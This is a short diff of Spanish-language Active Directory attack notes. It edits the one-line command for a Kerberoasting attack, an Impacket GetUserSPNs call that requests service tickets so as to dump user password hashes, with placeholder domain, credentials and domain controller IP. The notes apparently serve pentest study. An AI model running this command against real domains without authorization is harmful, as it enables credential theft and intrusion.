@@ -14,7 +14,7 @@ Ejemplo:
 # Efectuar ataque con GetUserSPNs
 Este ataque nos permite dumpear el hash de los usuarios que sean vulnerables.
 ```
-python GetUsersSPNs.py <DOMINIO>/<usuario>:<contraseña> -dc-ip <ip_DC> -request
+GetUsersSPNs.py <DOMINIO>/<usuario>:<contraseña> -dc-ip <ip_DC> -request
 ```
 [Ver ejemplo](/Apuntes-AD/Images/3.md)
 
